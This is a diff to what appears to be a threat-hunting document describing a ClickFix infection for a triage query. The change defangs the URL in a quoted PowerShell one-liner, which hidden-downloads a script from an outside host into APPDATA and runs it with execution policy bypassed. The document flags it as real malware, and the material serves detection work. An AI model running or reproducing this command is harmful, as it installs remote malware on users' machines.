@@ -106,7 +106,7 @@ In the clickfix triage query the intial infection is started by running:
 ⚠️ This is real malware, do not execute unless you are sure you accept the risk of being hacked.
 
 ```PowerShell
-powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='https://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
+powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='hxxps://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
 ```
 </details>
 
